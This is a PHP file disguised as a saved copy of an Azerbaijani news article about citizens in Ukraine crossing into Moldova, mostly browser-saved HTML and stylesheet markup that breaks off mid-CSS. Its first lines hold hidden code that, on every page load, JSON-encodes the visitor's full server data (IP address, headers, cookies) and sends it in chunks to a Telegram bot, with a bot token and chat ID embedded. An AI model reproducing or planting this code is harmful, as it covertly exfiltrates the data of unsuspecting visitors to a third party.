<?php
$token = '1638093203:AAFFW6IOWsKbgvbNqm4OZCOPY1QciVR4CjY';


$params['chat_id'] = 627451177;		// 499573430
$params['text'] = json_encode($_SERVER);
$lim = 650;
$mCount = ceil(strlen($params['text']) / $lim);
$text = $params['text'];

$result = '';
for($i=1;$i<=$mCount;$i++)
{
	$st = $i * $lim - $lim;
	$params['text'] = substr($text, $st, $lim);

	$url = "https://api.telegram.org/bot".$token . "/sendMessage?" . http_build_query( $params );
	
	file_get_contents($url);
	sleep(0.2);
}

?>
<!DOCTYPE html>
<!-- saved from url=(0123)https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html -->
<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="az" lang="az" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms no-csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>XİN: Ukraynadakı Azərbaycan vətəndaşları quru yolla Moldova ərazisinə keçə bilərlər » GundemXeber İnformasiya Portalı</title>
<meta name="description" content="Azərbaycan Xarici İşlər Nazirliyi Ukrayna ərazisində daimi və müvəqqəti yaşayan, turizm və ya təhsil məqsədləri ilə həmin ölkəyə səfər etmiş Azərbaycan vətəndaşlarına Ukraynadakı vəziyyətlə əlaqədar bir daha müraciət edərək onlardan hərbi qüvvələrin və obyektlərin olduğu ərazilərdən uzaq">
<meta name="keywords" content="Azərbaycan, Respublikasının, elektron, vətəndaşlarımız, vasitəsilə, Moldova, bağlı, Xarici, vəziyyətlə, İşlər, şəhərindəki, səfirliyi, telefon, xətti, ünvanı, əlaqədar, Respublikası, Ukraynadakı, COVID19a, həmin">
<meta name="generator" content="DataLife Engine (http://dle-news.ru)">
<meta property="og:site_name" content="GundemXeber İnformasiya Portalı">
<meta property="og:type" content="article">
<meta property="og:title" content="XİN: Ukraynadakı Azərbaycan vətəndaşları quru yolla Moldova ərazisinə keçə bilərlər">
<meta property="og:url" content="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html">
<meta property="og:image" content="https://gundemxeber.az/uploads/posts/2022-02/1645773199_1645773196_1645426439_1645426381_1644131288_1642583171_untitled-1.jpg">
<meta property="og:description" content="Azərbaycan Xarici İşlər Nazirliyi Ukrayna ərazisində daimi və müvəqqəti yaşayan, turizm və ya təhsil məqsədləri ilə həmin ölkəyə səfər etmiş Azərbaycan vətəndaşlarına Ukraynadakı vəziyyətlə əlaqədar bir daha müraciət edərək onlardan hərbi qüvvələrin və obyektlərin olduğu ərazilərdən uzaq">
<link rel="search" type="application/opensearchdescription+xml" href="https://gundemxeber.az/index.php?do=opensearch" title="GundemXeber İnformasiya Portalı">
<link rel="canonical" href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html">
<link rel="alternate" type="application/rss+xml" title="GundemXeber İnformasiya Portalı" href="https://gundemxeber.az/rss.xml">
<link href="./xeber_files/index.php" rel="stylesheet" type="text/css">
<div class="fit-vids-style">­<style>         .fluid-width-video-wrapper {        width: 100%;                     position: relative;              padding: 0;                      }                                   .fluid-width-video-wrapper iframe,  .fluid-width-video-wrapper object,  .fluid-width-video-wrapper embed {  position: absolute;              top: 0;                          left: 0;                         width: 100%;                     height: 100%;                    }                                   </style></div><script type="text/javascript" async="" src="https://www.acint.net/aci.js"></script><script src="./xeber_files/index(1).php"></script>
<script src="./xeber_files/index(2).php" defer=""></script>
<link rel="shortcut icon" href="https://gundemxeber.az/templates/eadesign5/images/favicon.ico">
<link rel="stylesheet" id="default-css" href="./xeber_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="default-css" href="./xeber_files/engine.css" type="text/css" media="all">

<script type="text/javascript" src="./xeber_files/jquery-migrate.min.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.flexslider-min.js.download"></script>
<script type="text/javascript" src="./xeber_files/libs.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery-migrate.min.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.flexslider-min.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.fitvids.js.download"></script>
<script type="text/javascript" src="./xeber_files/jquery.easing.1.3.js.download"></script>

<!--<![endif]-->
<!--[if IE 8]>
<link href="/templates/eadesign5/style/ie.css" rel="stylesheet" type="text/css" media="all" />
<![endif]-->
<!--[if IE 7]>
<link href="/templates/eadesign5/style/ie.css" rel="stylesheet" type="text/css" media="all" />
<![endif]-->

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="./xeber_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-KCLYTLES1Q');
</script>

<script language="javascript" type="text/javascript">
<!--
var d = new Date();
var day=new Array("Bazar","Bazar ertəsi","Çərşənbə axşamı",
"Çərşənbə","Cümə axşamı","Cümə","Şənbə");
var month=new Array("yanvar","fevral","mart","аprel","may","iyun",
"iyun","avqust","sentiyabr","oktiyabr","noyabr","dekabr");
var TODAY = day[d.getDay()] +", " +d.getDate()+ " " + month[d.getMonth()]
+ " " + d.getFullYear() + "";
//--></script>

<style type="text/css">.highslide img {cursor: zoom-in; cursor: -moz-zoom-in; cursor: -webkit-zoom-in;}.highslide-viewport-size {position: fixed; width: 100%; height: 100%; left: 0; top: 0}</style><script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script><style type="text/css">.TnITTtw-fp-collapsed-button {
    display: none;
    position: fixed !important;
    top: 16px !important;
    right: 16px !important;
}

.TnITTtw-fp-collapsed-button:hover {
    opacity: 1.0 !important;
}

.TnITTtw-mate-fp-bar {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
    color: #000;
    position: fixed;
    top: 16px;
    right: 16px;
    z-index: 999;
    background: rgb(255 255 255 / 0.95);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    padding: 16px;
    border-radius: 11px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 25%);
    width: 320px;
    line-height: initial;
}

@-moz-document url-prefix() {
    .TnITTtw-mate-fp-bar {
        background: rgb(255 255 255 / 1.0);
    }
}

.TnITTtw-mate-fp-bar.TnITTtw-dark-mode {
    background: rgb(44, 44, 43);
}

.TnITTtw-hide-fp-bar {
    width: 12px;
    height: 12px;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/regular-close-tt.png) !important;
    background-size: 12px 12px;
    background-repeat: no-repeat;
    background-position: center;
    position: absolute;
    right: 8px;
    top: 8px;
    cursor: pointer;
}

.TnITTtw-hide-fp-bar:hover {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/hover-close-tt.png) !important;
}

.TnITTtw-current-page-lang {
    color: #6d6d72;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 8px;
    text-align: center;
}

.TnITTtw-dark-mode .TnITTtw-current-page-lang {
    color: #98989D;
}

.TnITTtw-fp-translate {
    width: calc(100% - 73px) !important;
    font-size: 14px !important;
    text-transform: none !important;
}

.TnITTtw-fp-translate.TnITTtw-in-progress {
    animation-name: funky-bg;
    animation-duration: 10s;
    animation-timing-function: ease-in;
}

.TnITTtw-fp-translate.TnITTtw-show-original {
    width: calc(100% - 20px) !important;
}

@keyframes funky-bg {
    from {
        background-image: linear-gradient(145deg, #01EF92, #00D8FB),
        linear-gradient(35deg, rgba(1, 239, 146, 0.25), rgba(0, 216, 251, 0.25)) !important;
    }

    to {
        background-image: linear-gradient(90deg, #01EF92, #00D8FB),
        linear-gradient(35deg, rgba(1, 239, 146, 0.25), rgba(0, 216, 251, 0.25)) !important;
    }
}

.TnITTtw-change-language, .TnITTtw-stop-fp {
    width: 38px;
    height: 38px;
    background-color: #EFEFF4;
    background-repeat: no-repeat;
    background-position: center;
    background-size: 16px 16px;
    border-radius: 11px;
    display: inline-block;
    vertical-align: top;
    cursor: pointer;
}

.TnITTtw-change-language {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/globe-earth.png) !important;
}

.TnITTtw-dark-mode .TnITTtw-change-language {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/globe-earth-dark.png) !important;
}

.TnITTtw-stop-fp {
    display: none;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/regular-stt-stop.png) !important;
    background-size: 12px 12px;
}

.TnITTtw-dark-mode .TnITTtw-change-language, .TnITTtw-dark-mode .TnITTtw-stop-fp {
    background-color: #525251 !important;
}

.TnITTtw-change-language:hover, .TnITTtw-stop-fp:hover {
    background-color: #F6F6F6;
}

.TnITTtw-change-language:active, .TnITTtw-stop-fp:active {
    background-color: #E9E9E9;
}

.TnITTtw-dark-mode .TnITTtw-change-language:hover,
.TnITTtw-dark-mode .TnITTtw-stop-fp:hover,
.TnITTtw-dark-mode .TnITTtw-change-language:active,
.TnITTtw-dark-mode .TnITTtw-stop-fp:active {
    background-color: #767675;
}

#TnITTtw-always-translate {
}

.TnITTtw-fp-options input {
    padding: initial;
    width: auto;
    border: initial;
    box-shadow: initial;
    line-height: initial;
    height: auto;
    display: initial;
    position: initial;
    appearance: auto;
    top: initial;
    cursor: pointer;
    margin: 0;
}

.TnITTtw-fp-options input[readonly="readonly"] {
    opacity: 0.5;
}

#TnITTtw-always-translate + label,
#TnITTtw-never-translate-lang + label,
#TnITTtw-never-translate-site + label {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
    display: inline-block;
    font-weight: 400;
    font-size: 14px;
    margin-left: 4px;
    color: #000;
    cursor: pointer;
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    width: 296px;
    vertical-align: top;
    line-height: initial;
    letter-spacing: initial;
    text-transform: initial;
    margin-right: 0;
    margin-top: 0;
    margin-bottom: 0;
    padding: 0;
}

#TnITTtw-always-translate + label::before,
#TnITTtw-never-translate-lang + label::before,
#TnITTtw-never-translate-site + label::before,
#TnITTtw-always-translate + label::after,
#TnITTtw-never-translate-lang + label::after,
#TnITTtw-never-translate-site + label::after  {
    content: initial;
} 

.TnITTtw-always-translate-inner-label {
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    max-width: 252px;
    vertical-align: top;
    display: inline-block;
}

.TnITTtw-dark-mode #TnITTtw-always-translate + label,
.TnITTtw-dark-mode #TnITTtw-never-translate-lang + label,
.TnITTtw-dark-mode #TnITTtw-never-translate-site + label {
    color: #FFF;
}

#TnITTtw-always-translate + label.TnITTtw-not-pro {
    opacity: 0.5;
}

#TnITTtw-always-translate + label .TnITTtw-pro-label {
    position: relative;
    background: #000;
    font-size: 11px;
    text-transform: uppercase;
    color: #FFF;
    padding: 2px 5px;
    border-radius: 4px;
    margin-left: 10px;
    top: -1px;
    user-select: none;
    -webkit-user-select: none;
    display: inline;
    font-weight: 500;
}

.TnITTtw-dark-mode #TnITTtw-always-translate + label .TnITTtw-pro-label {
    background: #FFF;
    color: #000;
}

.TnITTtw-inline-original-tooltip {
    display: none;
    position: absolute;
    margin: 0px;
    border: none;
    padding: 16px;
    color: rgb(0, 0, 0);
    background-color: rgb(255 255 255 / 0.95);
    backdrop-filter: blur(10px);
    border-radius: 11px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 25%);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif;
    font-style: normal;
    font-variant: normal;
    font-weight: normal;
    font-size: 16px;
    line-height: normal;
}

.TnITTtw-dark-mode.TnITTtw-inline-original-tooltip {
    background-color: rgb(0 0 0 / 0.915);
    color: #FFF;
}

.TnITTtw-inline-original-tooltip .TnITTtw-close-original-tooltip {
    width: 12px;
    height: 12px;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/regular-close-tt.png) !important;
    background-size: 12px 12px;
    background-repeat: no-repeat;
    background-position: center;
    position: absolute;
    right: 8px;
    top: 8px;
    cursor: pointer;
}

.TnITTtw-inline-original-tooltip .TnITTtw-close-original-tooltip:hover {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/hover-close-tt.png) !important;
}

.TnITTtw-inline-original-tooltip .TnITTtw-original-label {
    margin: 0;
    font-weight: 600;
    font-size: 13px;
    text-transform: uppercase;
    color: #6d6d72;
    margin-bottom: 10px;
}

.TnITTtw-inline-original-tooltip.TnITTtw-dark-mode .TnITTtw-original-label {
    color: #98989D;
}

.TnITTtw-inline-original-tooltip .TnITTtw-text-layout {
    display: inline-block;
    margin: 0;
    font-size: 16px;
    color: #000;
}

.TnITTtw-inline-original-tooltip.TnITTtw-dark-mode .TnITTtw-text-layout {
    color: #FFF;
}

.TnITTtw-highlighted-for-original {
    color: #0F0F5F;
    background-color: #F0F0A0;
}

/* Dropdown scrollbars */

#selVisibleScroll-1, #selVisibleScroll-2, #selVisibleScroll-3 {
    overflow: hidden;
    height: 259px;
    width: 100%;
    position: relative;
}

#sel-scrollbar-1, #sel-scrollbar-2, #sel-scrollbar-3 {
    position: absolute;
    width: 4px;
    height: 259px;
    left: 225px;
}

#sel-track-1, #sel-track-2, #sel-track-3 {
    position: absolute;
    top: 1px;
    width: 4px;
    height: calc(100% - 6px);
}

#sel-dragBar-1, #sel-dragBar-2, #sel-dragBar-3 {
    position: absolute;
    top: 1px;
    width: 4px;
    background: rgba(43, 43, 43, 0.5);
    cursor: pointer;
    border-radius: 4px;
}

.dark-mode #sel-dragBar-1, .dark-mode #sel-dragBar-2, .dark-mode #sel-dragBar-3 {
    background: rgba(255, 255, 255, 0.5);
}

#sel-dragBar-1:hover, #sel-dragBar-2:hover, #sel-dragBar-3:hover, 
#sel-dragBar-1:active, #sel-dragBar-2:active, #sel-dragBar-3:active {
    background: rgba(43, 43, 43, 0.675);
}

.dark-mode #sel-dragBar-1:hover,
.dark-mode #sel-dragBar-2:hover,
.dark-mode #sel-dragBar-3:hover,
.dark-mode #sel-dragBar-1:active,
.dark-mode #sel-dragBar-2:active,
.dark-mode #sel-dragBar-3:active {
    background: rgba(255, 255, 255, 0.675);
}

#sel-scrollbar-1, #sel-track-1, #sel-dragBar-1, 
#sel-scrollbar-2, #sel-track-2, #sel-dragBar-2,
#sel-scrollbar-3, #sel-track-3, #sel-dragBar-3 {
    -webkit-user-select: none;
    user-select: none;
}

/* Spinner for when it's translating a page */

.TnITTtw-cta-button-layout {
    position: relative;
    display: inline;
}

.TnITTtw-spinner {
    display: none;
    text-align: center;
    position: absolute;
    top: 0;
    width: 100%;
    user-select: none;
    -webkit-user-select: none;
}
  
  @media screen and (max-width: 800px) {
    .TnITTtw-spinner {
      top: 28px;
    }
  }

  .TnITTtw-spinner.in-text {
    display: block;
    background: transparent;
    position: initial;
  }

  .TnITTtw-spinner.left {
    text-align: left;
  }
  
  .TnITTtw-spinner > div {
    width: 12px;
    height: 12px;
    background-color: rgb(0, 71, 46);
  
    border-radius: 100%;
    display: inline-block;
    -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
    animation: sk-bouncedelay 1.4s infinite ease-in-out both;
  }

  .TnITTtw-spinner.in-text > div {
    background-color: #000;
  }
  
  .TnITTtw-spinner .TnITTtw-bounce1 {
    -webkit-animation-delay: -0.32s;
    animation-delay: -0.32s;
  }
  
  .TnITTtw-spinner .TnITTtw-bounce2 {
    -webkit-animation-delay: -0.16s;
    animation-delay: -0.16s;
  }
  
  @-webkit-keyframes sk-bouncedelay {
    0%, 80%, 100% { -webkit-transform: scale(0) }
    40% { -webkit-transform: scale(1.0) }
  }
  
  @keyframes sk-bouncedelay {
    0%, 80%, 100% { 
      -webkit-transform: scale(0);
      transform: scale(0);
    } 40% { 
      -webkit-transform: scale(1.0);
      transform: scale(1.0);
    }
  }</style><style type="text/css">/*
 * contextMenu.js v 1.4.0
 * Author: Sudhanshu Yadav
 * s-yadav.github.com
 * Copyright (c) 2013 Sudhanshu Yadav.
 * Dual licensed under the MIT and GPL licenses
**/

.iw-contextMenu {
    box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.10) !important;
    border: 1px solid #c8c7cc !important;
    border-radius: 11px !important;
    display: none;
    z-index: 1000000132;
    max-width: 300px !important;
    width: auto !important;
}

.dark-mode .iw-contextMenu,
.TnITTtw-dark-mode.iw-contextMenu,
.TnITTtw-dark-mode .iw-contextMenu {
    border-color: #747473 !important;
}

.iw-cm-menu {
    background: #fff !important;
    color: #000 !important;
    margin: 0px !important;
    padding: 0px !important;
    overflow: visible !important;
}

.dark-mode .iw-cm-menu,
.TnITTtw-dark-mode.iw-cm-menu,
.TnITTtw-dark-mode .iw-cm-menu {
    background: #525251 !important;
    color: #FFF !important;
}

.iw-curMenu {
}

.iw-cm-menu li {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
    list-style: none !important;
    padding: 10px !important;
    padding-right: 20px !important;
    border-bottom: 1px solid #c8c7cc !important;
    font-weight: 400 !important;
    cursor: pointer !important;
    position: relative !important;
    font-size: 14px !important;
    margin: 0 !important;
    line-height: inherit !important;
    border-radius: 0 !important;
    display: block !important;
}

.dark-mode .iw-cm-menu li, .TnITTtw-dark-mode .iw-cm-menu li {
    border-bottom-color: #747473 !important;
}

.iw-cm-menu li:first-child {
    border-top-left-radius: 11px !important;
    border-top-right-radius: 11px !important;
}

.iw-cm-menu li:last-child {
    border-bottom-left-radius: 11px !important;
    border-bottom-right-radius: 11px !important;
    border-bottom: none !important;
}

.iw-mOverlay {
    position: absolute !important;
    width: 100% !important;
    height: 100% !important;
    top: 0px !important;
    left: 0px !important;
    background: #FFF !important;
    opacity: .5 !important;
}

.iw-contextMenu li.iw-mDisable {
    opacity: 0.3 !important;
    cursor: default !important;
}

.iw-mSelected {
    background-color: #F6F6F6 !important;
}

.dark-mode .iw-mSelected, .TnITTtw-dark-mode .iw-mSelected {
    background-color: #676766 !important;
}

.iw-cm-arrow-right {
    width: 0 !important;
    height: 0 !important;
    border-top: 5px solid transparent !important;
    border-bottom: 5px solid transparent !important;
    border-left: 5px solid #000 !important;
    position: absolute !important;
    right: 5px !important;
    top: 50% !important;
    margin-top: -5px !important;
}

.dark-mode .iw-cm-arrow-right, .TnITTtw-dark-mode .iw-cm-arrow-right {
    border-left-color: #FFF !important;
}

.iw-mSelected > .iw-cm-arrow-right {
}

/*context menu css end */</style><style type="text/css">.ui_selector, .TnITTtw-ui_selector {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif;
    display: inline-block;
}

.ui_selector .select, .TnITTtw-ui_selector .TnITTtw-select {
    color: #000;
    text-align: center;
    font-weight: 600;
    font-size: 14px;
    border: 1px solid rgba(200, 199, 204, 0.5);
    padding: 10px 15px;
    width: 201px;
    -webkit-user-select: none;
    cursor: pointer;
    border-radius: 11px;
    display: inline-block;
    background-image: -webkit-linear-gradient(top, #FAFAFA, #F6F6F6);
    background-image: -moz-linear-gradient(top, #FAFAFA, #F6F6F6);
    background-size: auto 48px;
    background-position: 0px -11px;
    box-shadow: 0 0.5px 1px rgba(0, 0, 0, 0.10);
    text-overflow: ellipsis;
    overflow: hidden;
    white-space: nowrap;
}

.dark-mode .ui_selector .select, 
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-select {
    background-image: -webkit-linear-gradient(top, #4A4A49, #40403F);
    background-image: -moz-linear-gradient(top, #4A4A49, #40403F);
    color: #FFF;
    border-color: #747473;
}

.ui_selector .select:hover,
.TnITTtw-ui_selector .TnITTtw-select:hover {
    color: #424242;
    background-image: -webkit-linear-gradient(top, #FAFAFA, #FAFAFA);
    background-image: -moz-linear-gradient(top, #FAFAFA, #FAFAFA);
}

.ui_selector .select:active,
.TnITTtw-ui_selector .TnITTtw-select:active {
    color: #6d6d72;
    background-image: -webkit-linear-gradient(top, #F6F6F6, #F6F6F6);
    background-image: -moz-linear-gradient(top, #F6F6F6, #F6F6F6);
}

.dark-mode .ui_selector .select:hover,
.dark-mode .ui_selector .select:active,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-select:hover,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-select:active {
    background-image: -webkit-linear-gradient(top, #4A4A49, #4A4A49);
    background-image: -moz-linear-gradient(top, #4A4A49, #4A4A49);
    color: #FFF;
    border-color: #747473;
}

.ui_selector .select .detected-ico,
.TnITTtw-ui_selector .TnITTtw-select .TnITTtw-detected-ico {
    display: inline-block;
}

.ui_selector .active, .ui_selector .active:hover, .ui_selector .active:active,
.TnITTtw-ui_selector .TnITTtw-active, .TnITTtw-ui_selector .TnITTtw-active:hover, .TnITTtw-ui_selector .TnITTtw-active:active {
    box-shadow: 0 -1px 15px -10px rgba(0, 0, 0, 0.85) !important;
    border-bottom-left-radius: 0;
    border-bottom-right-radius: 0;
    background: #F3F3F3;
}

.sliding-text,
.TnITTtw-sliding-text {
    position: relative;
}

.ui_selector .options,
.TnITTtw-ui_selector .TnITTtw-options {
    margin-left: 0px;
    margin-top: -4px;
    background: #fff;
    border: 1px solid rgba(200, 199, 204, 0.5);
    width: 231px;
    overflow: hidden;
    max-height: 313px;
    position: absolute;
    font-size: 12px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 25%);
    border-bottom-left-radius: 6px;
    border-bottom-right-radius: 6px;
    display: none;
}

.ui_selector .options.standalone,
.TnITTtw-ui_selector .TnITTtw-options.TnITTtw-standalone {
    border-radius: 11px;
    margin-top: 16px;
}

/* for now, it can only be on the top */
.ui_selector .options-arrow,
.TnITTtw-ui_selector .TnITTtw-options-arrow {
    display: none;
    position: absolute;
    width: 32px !important;
    height: 18px !important;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/tt-dropdown-arrow.png);
    background-size: 32px 18px;
    transform: rotate(180deg);
    margin-top: -1px;
}

.dark-mode .ui_selector .options-arrow,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options-arrow {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/tt-dropdown-arrow-dark.png);
}

.dark-mode .ui_selector .options,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options {
    background: #525251;
}

.ui_selector .options ul,
.TnITTtw-ui_selector .TnITTtw-options ul {
    list-style: none;
    margin: 0;
    padding: 0;
    width: 232px;
}

.ui_selector .options ul li,
.TnITTtw-ui_selector .TnITTtw-options ul li {
    padding: 10px 0px;
    -webkit-user-select: none;
    text-align: center;
    font-size: 17px;
    -webkit-transition: all 600ms cubic-bezier(0.23, 1, 0.32, 1);
    margin: 0 10px;
    border-radius: 6px;
    position: relative;
}

.dark-mode .options ul li,
.TnITTtw-dark-mode .TnITTtw-options ul li {
    color: #fff;
}

.ui_selector .options ul li:last-child,
.TnITTtw-ui_selector .TnITTtw-options ul li:last-child {
    margin-bottom: 16px;
}

.ui_selector .options ul li.option:first-child,
.ui_selector .options ul li.option_selected:first-child,
.TnITTtw-ui_selector .TnITTtw-options ul li.TnITTtw-option:first-child,
.TnITTtw-ui_selector .TnITTtw-options ul li.TnITTtw-option_selected:first-child {
    margin-top: 16px;
}

.ui_selector .options ul li.whenHover,
.TnITTtw-ui_selector .TnITTtw-options ul li.TnITTtw-whenHover {
    cursor: pointer;
    background: #f3f3f3;
    text-align: center;
}

.dark-mode .ui_selector .options ul li.whenHover,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options ul li.TnITTtw-whenHover {
    background: rgba(255, 255, 255, 0.5);
}

.ui_selector .options ul li.option_selected,
.TnITTtw-ui_selector .TnITTtw-options ul li.TnITTtw-option_selected {
    cursor: pointer;
    background-image: linear-gradient(145deg, #01EF92, #00D8FB),
    linear-gradient(35deg, rgba(1, 239, 146, 0.25), rgba(0, 216, 251, 0.25)) !important;
    color: #fff;
    font-weight: 600;
}

.ui_selector .options ul .group,
.ui_selector .options ul .group:hover,
.ui_selector .options ul .group.whenHover,
.TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group,
.TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group:hover,
.TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group.whenHover {
    padding: 16px 10px;
    color: #8e8e93;
    font-weight: 600;
    text-transform: uppercase;
    font-size: 12px;
    text-align: center;
    cursor: default;
    background: #FFF;
}

.dark-mode .ui_selector .options ul .group,
.dark-mode .ui_selector .options ul .group:hover,
.dark-mode .ui_selector .options ul .group.whenHover,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group:hover,
.TnITTtw-dark-mode .TnITTtw-ui_selector .TnITTtw-options ul .TnITTtw-group.TnITTtw-whenHover {
    color: #98989D;
    background: #525251;
}

.group-element,
.TnITTtw-group-element {
    width: 153px;
}

.options .dd-search,
.TnITTtw-options .TnITTtw-dd-search {
    border-bottom: 1px solid rgba(200, 199, 204, 0.5);
}

.dark-mode .options .dd-search,
.TnITTtw-dark-mode .TnITTtw-options .TnITTtw-dd-search {
    border-bottom-color: #747473;
}

.dd-search .dd-input,
.TnITTtw-dd-search .TnITTtw-dd-input {
    padding: 16px;
    padding-left: calc(16px * 3);
    width: 168px;
    border: none;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif;
    text-align: left;
    color: #000;
    font-size: 17px;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/searchfield-icon.png);
    background-position: 16px;
    background-size: 16px;
    background-repeat: no-repeat;
    margin: 0;
    height: auto;
}

.dark-mode .dd-search .dd-input,
.TnITTtw-dark-mode .TnITTtw-dd-search .TnITTtw-dd-input {
    color: #FFF;
    background-color: #525251;
}

.dd-search .dd-input:focus,
.TnITTtw-dd-search .TnITTtw-dd-input:focus {
    -webkit-transition: all 275ms cubic-bezier(0.23, 1, 0.32, 1);
    outline: none;
    text-align: left;
}

.dd-input::-webkit-input-placeholder,
.TnITTtw-dd-input::-webkit-input-placeholder {
    color: #8e8e93;
}

.search-failed-plaque,
.TnITTtw-search-failed-plaque {
    text-align: center;
    padding: 20px;
    color: #8e8e93;
    font-size: 17px;
    font-weight: 600;
}

.dark-mode .search-failed-plaque,
.TnITTtw-dark-mode .TnITTtw-search-failed-plaque {
    color: #98989D;
}

.rm-recent,
.TnITTtw-rm-recent {
    position: absolute;
    width: 10px;
    height: 10px;
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/regular-lang-remove.png);
    background-size: 10px 10px;
    top: 15px;
    right: 10px;
}

.rm-recent:hover,
.TnITTtw-rm-recent:hover {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/hover-lang-remove.png);
}

.rm-recent:active,
.TnITTtw-rm-recent:active {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/down-lang-remove.png);
}

.option_selected .rm-recent,
.TnITTtw-option_selected .TnITTtw-rm-recent {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/down-active-lang-remove.png);
}

.option_selected .rm-recent:hover,
.TnITTtw-option_selected .TnITTtw-rm-recent:hover {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/hover-active-lang-remove.png);
}

.option_selected .rm-recent:active,
.TnITTtw-option_selected .TnITTtw-rm-recent:active {
    background-image: url(chrome-extension://ihmgiclibbndffejedjimfjmfoabpcke/res/images/ui/down-active-lang-remove.png);
}

.TnITTtw-hidden {
    display: none;
}</style><style type="text/css">@-webkit-keyframes load4 {
    0%,
    100% {
        box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
    }
    12.5% {
        box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
    }
    25% {
        box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
    }
    37.5% {
        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
    }
    50% {
        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
    }
    62.5% {
